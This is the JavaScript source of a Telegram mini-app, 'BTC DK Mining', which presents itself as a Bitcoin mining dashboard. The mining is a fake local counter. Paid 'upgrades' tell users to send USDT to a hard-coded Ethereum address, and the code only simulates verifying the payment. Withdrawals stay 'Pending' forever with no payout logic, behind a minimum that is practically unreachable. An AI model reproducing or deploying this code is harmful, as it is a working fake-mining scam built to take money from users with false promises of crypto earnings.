// BTC DK MINING - PROFESSIONAL EDITION
// Enterprise Grade Mining Interface

// ============================================
// GAME STATE - PREMIUM CONFIGURATION
// ============================================
const gameState = {
    // Balance & Mining
    balance: 0.000000001,
    totalMined: 0.000000001,
    miningSpeed: 9,
    baseMiningAmount: 0.000000001,
    
    // Session Management
    isAutoMining: false,
    miningSessionEnd: null,
    miningInterval: null,
    progressInterval: null,
    timerInterval: null,
    
    // Upgrades - Professional Pricing
    upgrades: {
        speedLevel: 0,
        efficiencyLevel: 0,
        maxSpeedLevel: 10,
        maxEfficiencyLevel: 5,
        speedCost: 29.99,
        efficiencyCost: 79.99
    },
    
    // Payment Configuration
    payments: {
        ethAddress: "0x742d35Cc6634C0532925a3b844Bc9e34F3bA2E1c",
        network: "ERC-20",
        confirmations: 3
    },
    
    // Withdrawal History
    withdrawalHistory: []
};

// ============================================
// TELEGRAM WEB APP INITIALIZATION
// ============================================
const tg = window.Telegram?.WebApp;
if (tg) {
    tg.expand();
    tg.ready();
    tg.setHeaderColor?.(document.body.style.backgroundColor);
    tg.setBackgroundColor?.(document.body.style.backgroundColor);
}

// ============================================
// LOAD / SAVE STATE
// ============================================
function loadGameState() {
    try {
        const saved = localStorage.getItem('btcDKMining_pro');
        if (saved) {
            const parsed = JSON.parse(saved);
            
            // Resume mining session if still active
            if (parsed.miningSessionEnd && new Date(parsed.miningSessionEnd) > new Date()) {
                Object.assign(gameState, parsed);
                startMiningSession();
            } else {
                Object.assign(gameState, parsed);
                gameState.isAutoMining = false;
                gameState.miningSessionEnd = null;
            }
        }
    } catch (e) {
        console.error('Error loading state:', e);
    }
    
    updateUI();
    updateUSDValues();
}

function saveGameState() {
    try {
        localStorage.setItem('btcDKMining_pro', JSON.stringify(gameState));
    } catch (e) {
        console.error('Error saving state:', e);
    }
}

// ============================================
// UI UPDATES - PROFESSIONAL DASHBOARD
// ============================================
function updateUI() {
    // Balance Display
    updateElement('balance', gameState.balance.toFixed(9));
    updateElement('available-balance', gameState.balance.toFixed(9));
    updateElement('total-mined', gameState.totalMined.toFixed(9));
    
    // Mining Statistics
    const currentSpeed = Math.max(3, gameState.miningSpeed - (gameState.upgrades.speedLevel * 3));
    const miningAmount = gameState.baseMiningAmount * Math.pow(2, gameState.upgrades.efficiencyLevel);
    
    updateElement('mining-speed', currentSpeed);
    updateElement('mining-amount', miningAmount.toFixed(9));
    updateElement('next-reward', miningAmount.toFixed(9) + ' BTC');
    
    // Upgrade Levels
    updateElement('speed-level', gameState.upgrades.speedLevel);
    updateElement('speed-level-display', gameState.upgrades.speedLevel);
    updateElement('efficiency-level', gameState.upgrades.efficiencyLevel);
    updateElement('efficiency-level-display', gameState.upgrades.efficiencyLevel);
    
    // Speed Display
    updateElement('current-mining-speed', currentSpeed);
    updateElement('next-speed', Math.max(3, currentSpeed - 3));
    
    // Multiplier Display
    const currentMultiplier = Math.pow(2, gameState.upgrades.efficiencyLevel);
    const nextMultiplier = Math.pow(2, gameState.upgrades.efficiencyLevel + 1);
    updateElement('current-multiplier', currentMultiplier);
    updateElement('next-multiplier', nextMultiplier);
    
    // Mining Button State
    const mineBtn = document.getElementById('mine-btn');
    if (mineBtn) {
        if (gameState.isAutoMining) {
            mineBtn.innerHTML = '⚡ Mining Session Active';
            mineBtn.disabled = true;
        } else {
            mineBtn.innerHTML = '⚡ Start 2-Hour Mining Session';
            mineBtn.disabled = false;
        }
    }
    
    // Update Upgrade Buttons
    updateUpgradeButtons();
    
    // Update Timer
    updateTimerDisplay();
    
    // Update Withdrawal History
    updateWithdrawalHistory();
}

function updateElement(id, value) {
    const el = document.getElementById(id);
    if (el) el.textContent = value;
}

// ============================================
// USD VALUE CONVERSION
// ============================================
const BTC_TO_USD = 45000; // Approximate BTC price

function updateUSDValues() {
    const balanceUSD = gameState.balance * BTC_TO_USD;
    const availableUSD = gameState.balance * BTC_TO_USD;
    
    updateElement('balance-usd', balanceUSD.toFixed(2));
    updateElement('available-usd', availableUSD.toFixed(2));
}

// ============================================
// MINING SESSION MANAGEMENT
// ============================================
function startMining() {
    if (gameState.isAutoMining) return;
    
    // Set 2-hour session
    const now = new Date();
    gameState.miningSessionEnd = new Date(now.getTime() + (2 * 60 * 60 * 1000));
    gameState.isAutoMining = true;
    
    startMiningSession();
    saveGameState();
    
    if (tg) {
        tg.showAlert('✓ 2-hour mining session initiated\nMining will continue automatically');
    }
}

function startMiningSession() {
    // Clear existing intervals
    if (gameState.miningInterval) clearInterval(gameState.miningInterval);
    if (gameState.timerInterval) clearInterval(gameState.timerInterval);
    
    // Calculate mining parameters
    const miningSpeed = Math.max(3, gameState.miningSpeed - (gameState.upgrades.speedLevel * 3));
    const miningAmount = gameState.baseMiningAmount * Math.pow(2, gameState.upgrades.efficiencyLevel);
    
    // Start mining cycle
    gameState.miningInterval = setInterval(() => {
        if (!gameState.isAutoMining) {
            clearInterval(gameState.miningInterval);
            return;
        }
        
        // Check if session expired
        if (new Date() >= new Date(gameState.miningSessionEnd)) {
            endMiningSession();
            return;
        }
        
        // Add mining reward
        gameState.balance += miningAmount;
        gameState.totalMined += miningAmount;
        
        updateUI();
        updateUSDValues();
        saveGameState();
        animateProgress();
        
    }, miningSpeed * 1000);
    
    // Update timer every second
    gameState.timerInterval = setInterval(updateTimerDisplay, 1000);
}

function endMiningSession() {
    gameState.isAutoMining = false;
    gameState.miningSessionEnd = null;
    
    if (gameState.miningInterval) {
        clearInterval(gameState.miningInterval);
        gameState.miningInterval = null;
    }
    
    if (gameState.timerInterval) {
        clearInterval(gameState.timerInterval);
        gameState.timerInterval = null;
    }
    
    updateUI();
    saveGameState();
    
    if (tg) {
        tg.showAlert('⏹ Mining session completed\nStart a new session to continue');
    }
}

// ============================================
// PROGRESS ANIMATION
// ============================================
function animateProgress() {
    const progressBar = document.getElementById('progress');
    const progressText = document.getElementById('progress-text');
    
    if (progressBar && progressText) {
        progressBar.style.transition = 'none';
        progressBar.style.width = '0%';
        
        const miningSpeed = Math.max(3, gameState.miningSpeed - (gameState.upgrades.speedLevel * 3));
        
        setTimeout(() => {
            progressBar.style.transition = `width ${miningSpeed}s linear`;
            progressBar.style.width = '100%';
            
            // Update progress text
            let progress = 0;
            const progressInterval = setInterval(() => {
                progress += 1;
                if (progressText) {
                    progressText.textContent = `${progress}%`;
                }
                if (progress >= 100) {
                    clearInterval(progressInterval);
                    progressText.textContent = '0%';
                }
            }, miningSpeed * 10);
        }, 10);
    }
}

// ============================================
// TIMER DISPLAY
// ============================================
function updateTimerDisplay() {
    const timerDisplay = document.getElementById('timer-display');
    const timerLabel = document.getElementById('timer-label');
    const sessionProgress = document.getElementById('session-progress');
    
    if (!timerDisplay) return;
    
    if (gameState.isAutoMining && gameState.miningSessionEnd) {
        const now = new Date();
        const end = new Date(gameState.miningSessionEnd);
        const diff = end - now;
        
        if (diff <= 0) {
            endMiningSession();
            return;
        }
        
        const hours = Math.floor(diff / (1000 * 60 * 60));
        const minutes = Math.floor((diff % (1000 * 60 * 60)) / (1000 * 60));
        const seconds = Math.floor((diff % (1000 * 60)) / 1000);
        
        timerDisplay.textContent = `${hours.toString().padStart(2, '0')}:${minutes.toString().padStart(2, '0')}:${seconds.toString().padStart(2, '0')}`;
        if (timerLabel) timerLabel.textContent = 'ACTIVE MINING SESSION';
        if (sessionProgress) sessionProgress.textContent = `${hours}h ${minutes}m remaining`;
    } else {
        timerDisplay.textContent = '--:--:--';
        if (timerLabel) timerLabel.textContent = 'NO ACTIVE SESSION';
        if (sessionProgress) sessionProgress.textContent = 'No active session';
    }
}

// ============================================
// UPGRADE SYSTEM - PROFESSIONAL
// ============================================
function buyUpgrade(type) {
    if (type === 'speed') {
        if (gameState.upgrades.speedLevel >= gameState.upgrades.maxSpeedLevel) {
            if (tg) tg.showAlert('Maximum speed level reached (10/10)');
            return;
        }
        
        const cost = gameState.upgrades.speedCost;
        const nextSpeed = Math.max(3, gameState.miningSpeed - ((gameState.upgrades.speedLevel + 1) * 3));
        
        if (tg) {
            tg.showConfirm(
                `⚡ Speed Acceleration Upgrade\n\n` +
                `Investment: $${cost} USDT\n` +
                `Current Speed: ${Math.max(3, gameState.miningSpeed - (gameState.upgrades.speedLevel * 3))}s\n` +
                `New Speed: ${nextSpeed}s\n` +
                `Level: ${gameState.upgrades.speedLevel + 1}/10\n\n` +
                `Send $${cost} USDT (ERC-20) to:\n${gameState.payments.ethAddress}`,
                (confirmed) => {
                    if (confirmed) {
                        processUpgrade('speed', cost);
                    }
                }
            );
        }
    }
    
    if (type === 'efficiency') {
        if (gameState.upgrades.efficiencyLevel >= gameState.upgrades.maxEfficiencyLevel) {
            if (tg) tg.showAlert('Maximum efficiency level reached (5/5)');
            return;
        }
        
        const cost = gameState.upgrades.efficiencyCost;
        const nextMultiplier = Math.pow(2, gameState.upgrades.efficiencyLevel + 1);
        
        if (tg) {
            tg.showConfirm(
                `💎 Hashrate Multiplier Upgrade\n\n` +
                `Investment: $${cost} USDT\n` +
                `Current Multiplier: ${Math.pow(2, gameState.upgrades.efficiencyLevel)}x\n` +
                `New Multiplier: ${nextMultiplier}x\n` +
                `Level: ${gameState.upgrades.efficiencyLevel + 1}/5\n\n` +
                `Send $${cost} USDT (ERC-20) to:\n${gameState.payments.ethAddress}`,
                (confirmed) => {
                    if (confirmed) {
                        processUpgrade('efficiency', cost);
                    }
                }
            );
        }
    }
}

function processUpgrade(type, cost) {
    // Simulate transaction verification
    if (tg) {
        tg.showAlert(`⏳ Transaction verification in progress...\nUpgrade will activate within 60 seconds`);
    }
    
    // Simulate blockchain confirmation
    setTimeout(() => {
        if (type === 'speed') {
            gameState.upgrades.speedLevel++;
            
            // Increase cost for next level
            gameState.upgrades.speedCost = Math.min(99.99, gameState.upgrades.speedCost + 5);
            
            if (tg) {
                tg.showAlert(`✓ Speed Acceleration Level ${gameState.upgrades.speedLevel} Activated\nMining speed: ${Math.max(3, gameState.miningSpeed - (gameState.upgrades.speedLevel * 3))}s per cycle`);
            }
        }
        
        if (type === 'efficiency') {
            gameState.upgrades.efficiencyLevel++;
            
            // Increase cost for next level
            gameState.upgrades.efficiencyCost = Math.min(199.99, gameState.upgrades.efficiencyCost + 15);
            
            if (tg) {
                tg.showAlert(`✓ Hashrate Multiplier Level ${gameState.upgrades.efficiencyLevel} Activated\nOutput: ${Math.pow(2, gameState.upgrades.efficiencyLevel)}x per cycle`);
            }
        }
        
        // Restart mining if active
        if (gameState.isAutoMining) {
            startMiningSession();
        }
        
        updateUI();
        updateUpgradeButtons();
        saveGameState();
        
    }, 3000);
}

function updateUpgradeButtons() {
    // Speed button
    const speedBtn = document.getElementById('speed-btn');
    if (speedBtn) {
        if (gameState.upgrades.speedLevel >= gameState.upgrades.maxSpeedLevel) {
            speedBtn.innerHTML = '✓ Maximum Level Reached';
            speedBtn.disabled = true;
        } else {
            speedBtn.innerHTML = `Purchase Speed Upgrade - $${gameState.upgrades.speedCost.toFixed(2)}`;
            speedBtn.disabled = false;
        }
    }
    
    // Efficiency button
    const efficiencyBtn = document.getElementById('efficiency-btn');
    if (efficiencyBtn) {
        if (gameState.upgrades.efficiencyLevel >= gameState.upgrades.maxEfficiencyLevel) {
            efficiencyBtn.innerHTML = '✓ Maximum Level Reached';
            efficiencyBtn.disabled = true;
        } else {
            efficiencyBtn.innerHTML = `Purchase Efficiency Upgrade - $${gameState.upgrades.efficiencyCost.toFixed(2)}`;
            efficiencyBtn.disabled = false;
        }
    }
}

// ============================================
// WITHDRAWAL SYSTEM - PROFESSIONAL
// ============================================
function withdraw() {
    const amountInput = document.getElementById('withdraw-amount');
    const walletInput = document.getElementById('wallet-address');
    
    const amount = parseFloat(amountInput?.value || '0');
    const wallet = walletInput?.value.trim() || '';
    
    // Validation
    if (!amount || amount < 0.001) {
        if (tg) tg.showAlert('Minimum withdrawal: 0.001 BTC');
        return;
    }
    
    if (amount > gameState.balance) {
        if (tg) tg.showAlert(`Insufficient balance\nAvailable: ${gameState.balance.toFixed(8)} BTC`);
        return;
    }
    
    if (!wallet || wallet.length < 26) {
        if (tg) tg.showAlert('Please enter a valid Bitcoin wallet address');
        return;
    }
    
    const fee = 0.0001;
    const netAmount = amount - fee;
    
    if (netAmount <= 0) {
        if (tg) tg.showAlert('Amount too small after network fee');
        return;
    }
    
    if (tg) {
        tg.showConfirm(
            `💰 Withdrawal Request\n\n` +
            `Amount: ${amount.toFixed(8)} BTC\n` +
            `Network Fee: ${fee.toFixed(8)} BTC\n` +
            `You Receive: ${netAmount.toFixed(8)} BTC\n` +
            `Destination: ${wallet.substring(0, 10)}...${wallet.substring(wallet.length - 6)}\n\n` +
            `Processing time: 1-24 hours`,
            (confirmed) => {
                if (confirmed) {
                    processWithdrawal(amount, netAmount, wallet, fee);
                }
            }
        );
    }
}

function processWithdrawal(amount, netAmount, wallet, fee) {
    // Deduct balance
    gameState.balance -= amount;
    
    // Create withdrawal record
    const withdrawal = {
        id: Date.now(),
        date: new Date().toISOString(),
        amount: amount,
        fee: fee,
        netAmount: netAmount,
        wallet: wallet,
        status: 'pending',
        txHash: null
    };
    
    gameState.withdrawalHistory.unshift(withdrawal);
    
    updateUI();
    updateUSDValues();
    updateWithdrawalHistory();
    saveGameState();
    
    // Clear form
    const amountInput = document.getElementById('withdraw-amount');
    const walletInput = document.getElementById('wallet-address');
    if (amountInput) amountInput.value = '';
    if (walletInput) walletInput.value = '';
    
    if (tg) {
        tg.showAlert(
            `✓ Withdrawal Request Submitted\n\n` +
            `Amount: ${netAmount.toFixed(8)} BTC\n` +
            `Status: Pending\n` +
            `Estimated completion: 1-24 hours`
        );
    }
}

function updateWithdrawalHistory() {
    const historyList = document.getElementById('history-list');
    if (!historyList) return;
    
    if (gameState.withdrawalHistory.length === 0) {
        historyList.innerHTML = '<div style="text-align: center; padding: 30px; background: rgba(255,255,255,0.02); border-radius: 16px; color: #5a6a78;">No withdrawal history</div>';
        return;
    }
    
    let html = '';
    gameState.withdrawalHistory.slice(0, 5).forEach(item => {
        const date = new Date(item.date).toLocaleDateString('en-US', {
            month: 'short',
            day: 'numeric',
            hour: '2-digit',
            minute: '2-digit'
        });
        
        html += `
            <div style="background: rgba(255,255,255,0.02); border: 1px solid rgba(255,255,255,0.05); border-radius: 16px; padding: 16px; margin-bottom: 10px; display: flex; justify-content: space-between; align-items: center;">
                <div>
                    <div style="font-size: 14px; font-weight: 600; color: white;">${item.netAmount.toFixed(8)} BTC</div>
                    <div style="font-size: 12px; color: #5a6a78;">${date}</div>
                </div>
                <div>
                    <span style="padding: 6px 12px; border-radius: 100px; font-size: 12px; font-weight: 600; background: rgba(247,147,26,0.1); color: #f7931a; border: 1px solid rgba(247,147,26,0.2);">
                        Pending
                    </span>
                </div>
            </div>
        `;
    });
    
    historyList.innerHTML = html;
}

// ============================================
// UTILITIES
// ============================================
function copyAddress() {
    navigator.clipboard.writeText(gameState.payments.ethAddress).then(() => {
        if (tg) {
            tg.showAlert('✓ Payment address copied to clipboard');
        }
    });
}

function setMaxWithdraw() {
    const input = document.getElementById('withdraw-amount');
    if (input) {
        input.value = gameState.balance.toFixed(8);
        updateReceiveAmount();
    }
}

function updateReceiveAmount() {
    const amount = parseFloat(document.getElementById('withdraw-amount')?.value || '0');
    const receive = amount - 0.0001;
    const receiveEl = document.getElementById('receive-amount');
    if (receiveEl) {
        receiveEl.textContent = receive > 0 ? receive.toFixed(8) + ' BTC' : '0.00000000 BTC';
    }
}

// ============================================
// AUTO-SAVE
// ============================================
setInterval(saveGameState, 30000);

// ============================================
// INITIALIZATION
// ============================================
document.addEventListener('DOMContentLoaded', () => {
    loadGameState();
    
    // Withdrawal amount listener
    const withdrawInput = document.getElementById('withdraw-amount');
    if (withdrawInput) {
        withdrawInput.addEventListener('input', updateReceiveAmount);
    }
    
    // Professional welcome message
    if (!localStorage.getItem('btcDKMining_welcome')) {
        setTimeout(() => {
            if (tg) {
                tg.showAlert(
                    '⚡ BTC DK MINING - Professional Edition\n\n' +
                    '• 2-Hour mining sessions\n' +
                    '• USDT upgrades (ERC-20)\n' +
                    '• Minimum withdrawal: 0.001 BTC\n' +
                    '• Network fee: 0.0001 BTC\n\n' +
                    'Professional mining interface ready.'
                );
            }
            localStorage.setItem('btcDKMining_welcome', 'true');
        }, 1500);
    }
});

// Export for debugging (optional)
if (typeof module !== 'undefined' && module.exports) {
    module.exports = { gameState, startMining, buyUpgrade, withdraw };
}
